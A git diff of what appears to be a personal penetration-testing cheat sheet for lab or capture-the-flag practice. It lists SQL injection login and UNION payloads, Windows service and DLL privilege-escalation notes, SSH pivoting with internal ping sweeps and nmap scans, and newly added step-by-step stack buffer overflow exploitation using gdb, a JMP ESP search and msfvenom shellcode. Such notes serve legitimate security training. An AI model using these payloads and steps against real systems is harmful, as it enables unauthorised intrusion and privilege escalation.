@@ -40,8 +40,8 @@ username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 ->                        
                                                                                                       CHEAT CODE FOR USERNAME AS PASSWORD FIELDS
 
 
-          ###POST METHOD###StudentPrivPassword
-
+          ###POST METHOD###
+StudentPrivPassword
   Ford' OR 1='1                       #DID NOT WORK
   Dodge' OR 1='1                      #DID NOT WORK
   Honda' OR 1='1                      #DID NOT WORK
@@ -255,6 +255,7 @@ schtasks /query /fo LIST /v
         ###FINDING VULNERABLE SERVICES####
 GUI Services
 sc query
+Filter on Descriptions
 
 ###MALICIOUS DLL###
 (1) Services                #SORT BY DESCRIPTION AND FIND ONE WITH NO DESCRIPTION OR AN UNPROFESSIONAL ONE
@@ -309,13 +310,47 @@ http://127.0.0.1:1111/pick.php?product=7 UNION SELECT user_id,name,username FROM
 (7) DECODE PASSWORDS
 (8) CREATE CONTROL SOCKET TO PUBLIC FACING WEB SERVER
     ssh -MS /tmp/pub user2@10.10.10.10
-(9) ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r
+(9) ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r | ip n
 (10) cat /etc/hosts | for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done | SCAN NETWORK THAT DISCOVERED HOST WAS ON
 (11) CREATE DYNAMIC PORT TO BE ABLE TO SCAN DISCOVERED HOSTS
 (12) SCAN DISCOVERED HOSTS WITH NMAP TO DISCOVER PORTS | nmap -Pn -T5 -Sv -vvvv 192.168.28.172,181
 (13) CREATE PORT FORWARDS TO NEWLY DISCOVERED HOSTS AND THEIR ASSOICIATED PORTS
-(14) GET ONTO BOX AND ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r
+(14) GET ONTO BOX AND ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r | ping sweep scan
 
+
+run strings on the exe
+run file one the exe
+run the exe
+test methods of parameters $() & <<<$()
+start buidling script
+#####
+#!/usr/bin/env python
+
+buff = "A" * 40
+
+print(buff)
+####
+Keep increasing buffer side until it breaks
+gdb ./func
+info functions
+pdisass main
+pdisass getuserinput
+run <<<$(linbuff.py)
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/  #CREATE A RANDOM SEQUENCE OF CHARACTERS GREATER THAN THE LENTH USED TO BREAK THE EXE ONCE BROKEN RUN THE SCRIPT AGAIN IN GDB AND GET THE EIP VALUE AND PUT IT INTO WIREMASK
+THEN EDIT SCRIPT TO REFLECT BUFFER SIDE AND ADD AN EIP VALUE OF BBBB
+
+env - gdb ./func   #CLEAN ENVIROMENT TO GET CORRECT EIP ADDRESS         #WILL NEED TO BE DONE ON THE TARGET TO MAKE SURE YOU HAVE CORRECT EIP LOCATION
+show env
+unset env LINES
+unset env COLUMNS
+run
+info proc map
+get first address after heap and last in the stack
+find /b 0xf7de1000,0xffffe000,0xff,0xe4
+  first after heap | last in stack |
+task the first 4
+ msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+add nop statement to script as well as add buf payload
 
 
 
